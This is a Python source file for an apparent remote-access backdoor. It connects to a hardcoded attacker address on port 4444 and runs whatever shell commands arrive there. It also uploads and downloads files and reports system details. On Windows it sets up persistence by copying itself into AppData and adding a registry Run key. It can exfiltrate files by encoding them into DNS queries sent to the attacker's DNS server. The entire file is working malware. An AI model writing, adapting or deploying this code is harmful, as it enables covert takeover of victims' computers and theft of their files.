import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import platform
import dnslib
import time
import select


class Backdoor:
    def __init__(self, ip, port, dns_server):
        self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.dns_server = dns_server
        self.sock_obj.connect((ip, port))

    def exec_system_cmd(self, command):
        command = " ".join(command)
        command = command.replace('\'', '"')
        try:
            DEVNULL = open(os.devnull,'wb') 
            # virtual NULL device to which I/O will be redirected to
            return subprocess.check_output(command, 
                                           shell=True,
                                           stderr=DEVNULL,
                                           stdin=DEVNULL)
        except:
            return "[+] ERROR - Error during command execution"
        
    def system_info(self, data):
        data += "|"
        data += platform.node()+"|"
        data += platform.system()+"|"
        data += platform.version()+"|"
        data += platform.processor()+"|"
        self.reliable_send(data)

    def persistence(self):
        operating_system = platform.system()
        data = ""

        if operating_system != "Windows":
            data = "[-] Non-Windows OS detected [-] Unable to establish persistence"
            self.system_info(data)
            return

        data += "[+] Windows OS detected"
        #location = os.environ["appdata"]+"\\scheduler.exe"
        location = os.environ["appdata"]+"\\client.py"
        if not os.path.exists(location):
            #shutil.copyfile(sys.executable, location) # to copy executable
            shutil.copyfile(__file__,location) # [to copy .py file]
            # [PERSISTENCE]
            #  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Scheduler /t REG_SZ /d C:/Users/user1/AppData/Roaming/scheduler.exe /f
            #                                                                                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            #                                                                                        os.environ['appdata']
            res = "|[+] Continuing with Persistence Operations"
            try:
                subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Scheduler /t REG_SZ /d '+location+' /f',shell=True)
                res = "|[+] Successfully added executable to the Registry"
            except:
                res = "|[-] ERROR - Cannot add executable for persistence"
            data = data + res
        else:
            data += "|[+] Persistence already established\n[+] Continuing previous session"
            
        self.system_info(data)
        return

    def reliable_send(self, data):
        if not isinstance(data, str):
            data = data.decode('utf-8')
        json_data = json.dumps(data)
        self.sock_obj.send(json_data.encode('utf-8'))
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.sock_obj.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except:
                continue
    
    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to "+path
        except:
            return "[+] ERROR - Invalid directory"
    
    def read_file(self, path):
        try:
            with open(path, "rb") as f_obj:
                return base64.b64encode(f_obj.read())
        except:
            return "[+]ERROR - Unable to read file"
    def write_file(self, name, content):
        try:
            with open(name, 'wb') as file_obj:
                file_obj.write(base64.b64decode(content))
                return "[+] File uploaded successfully"
        except:
            return "[+] ERROR - Error during creating a file"      

    def dns_udp_handle(self, data):
        query = dnslib.DNSRecord.question(f"{data}.southpark.com")
        dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_socket.setblocking(0)     

        while True:
            dns_socket.sendto(query.pack(), (self.dns_server, 53))
            state = select.select([dns_socket], [], [], 1)
            if state[0]:
                response = dnslib.DNSRecord.parse(dns_socket.recv(4096))
                break
    
    def send_over_dns(self, data, filename):
        resp = []
        resp.append(base64.b32encode(f"#FILE# {filename}".encode()))
        for i in range(0, len(data), 64):
            if i+64 > len(data) - 1:
                resp.append(data[i:len(data)])
                break
            resp.append(data[i:i+64])
        resp.append(base64.b32encode("#END#".encode()))
        for chunk in resp:
            encoded_chunk_str = str(chunk).strip("'b")
            self.dns_udp_handle(encoded_chunk_str)
            print(encoded_chunk_str)
            time.sleep(1)
            
    
    def recieve_over_dns(self, data):
        pass


    def tcp_run(self):
        self.persistence()
        while True:
            recv_data = self.reliable_receive()
            if recv_data[0] == "test":
                self.reliable_send("alive")
            if recv_data[0] == "exit":
                self.sock_obj.close()
                sys.exit(0) 
                # reliable exit -> prevents error message from being displayed
            elif recv_data[0] == "cd" and len(recv_data)>1:
                res = self.change_working_directory_to(recv_data[1])
            elif recv_data[0] == "download":
                res = self.read_file(recv_data[1])
            elif recv_data[0] == "upload":
                res = self.write_file(recv_data[1], recv_data[2])
            elif recv_data[0] == "DNS":
                self.sock_obj.close()
                self.dns_run(recv_data[1:])
                break
            else: 
                res = self.exec_system_cmd(recv_data)
            self.reliable_send(res)
    
    def dns_run(self, recv_data):
        if recv_data[0] == "download":
            buffer = None
            print(recv_data)
            with open(recv_data[1], "rb") as obj:
                buffer = obj.read()
            buffer = base64.b32encode(buffer)
            self.send_over_dns(buffer, recv_data[1].split('\\')[-1])
            sys.exit(0)
        else:
            return base64.b64encode("[+] Unable to perform request operation")
        '''        
        recv_data = self.send_over_dns("Active")
        while True:
            if recv_data[0] == "cd":
                response = self.change_working_directory_to([recv_data[1]])
                recv_data = self.send_over_dns(response)
            elif recv_data[0] == "exit":
                sys.exit(0)
            else:
                response = self.exec_system_cmd(recv_data[0])
                recv_data = self.send_over_dns(response)
        '''

try:
    backdoor = Backdoor("10.136.66.98",
                        4444,
                        "10.136.66.98")
    backdoor.tcp_run()
except:
    sys.exit(0)
